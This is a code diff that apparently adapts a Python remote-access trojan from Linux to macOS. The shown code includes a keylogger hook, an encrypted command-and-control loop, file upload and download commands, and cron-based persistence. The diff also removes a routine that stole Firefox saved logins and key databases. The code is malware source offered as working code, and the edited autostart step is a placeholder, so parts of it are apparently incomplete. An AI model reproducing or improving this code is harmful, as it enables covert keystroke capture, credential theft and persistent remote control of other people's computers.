@@ -17,14 +17,14 @@ hookman = pyxhook.HookManager()
 HKthread = thread
 HKstat = "OFF"
 
-def LinuxHOOKER(threadName, running):
+def MacHOOKER(threadName, running):
     hookman.KeyDown = kbevent
     hookman.HookKeyboard()
     hookman.start()
     while 1:
         time.sleep(0.1)
 
-def LinuxHOOK(status, namefile):
+def MacHOOK(status, namefile):
     global HKstat
     if status == "check":
         return HKstat
@@ -34,7 +34,7 @@ def LinuxHOOK(status, namefile):
             return report
         else:
             try:
-                HKthread.start_new_thread(LinuxHOOKER, ("HK-1",1))
+                HKthread.start_new_thread(MacHOOKER, ("HK-1",1))
                 log = open(namefile, 'wa')
                 HKstat = "ON"
                 return HKstat
@@ -131,6 +131,7 @@ def RecvData():
         temp = ssl_sock.read()
     return outData
 
+# some error here, to fix it
 def FindFile(path, fileType):
     FileList = open("list_"+fileType+".txt", "wa")
     for root, dirs, files in os.walk(path):
@@ -159,21 +160,7 @@ def RecvData():
     return outData
 
 def FirefoxThief():
-    if platform.system() == "Linux":
-        SendData("Ok: Linux supported")
-        if os.path.isdir("/home/"+getpass.getuser()+"/.mozilla/firefox/") == True:
-            os.chdir("/home/"+getpass.getuser()+"/.mozilla/firefox/")
-            SendData(EXEC("ls -la"))
-            newDir = RecvData()
-            UploadFILE("profiles.ini")
-            os.chdir("/home/"+getpass.getuser()+"/.mozilla/firefox/"+newDir)
-            UploadFILE("cert8.db")
-            UploadFILE("key3.db")
-            UploadFILE("logins.json")
-        else:
-            SendData("Error: Firefox directory not found!")
-    else:
-        SendData("Error: not Linux, not supported!")
+    SendData("Error: not Linux, not supported!")
 
 def DownHTTP(url,fileName):
     fileHTTP = urllib.URLopener()
@@ -339,17 +326,14 @@ while 1:
         SendData(VTresponse)
         SendData("end-info")
     elif inText.startswith("set"):
-        if inText.split(":")[1]== "autostart":
-            if platform.system() == "Linux":
-                SendData("LinuxAutoStart: " +LinuxAutoStart())
-                pass
-            elif platform.system() == "Windows":
-                SendData("WindowsAutoStart: "+WindowsAutoStart())
-            else: # at the moment os x not supported
-                SendData("No Windows/Linux system")
+        if inText.split(":")[1] == "autostart":
+            try:
+                EXEC("crontab * * * * * ChangeMe")
+                SendData("[crontab] ok")
+            except:
+                SendData("[crontab] error")
         else:
             SendData("usage: set:autostart")
-            pass
     elif inText.startswith("upload"):
         DownloadFILE(inText.split(" ")[1])
     elif inText == "terminate":
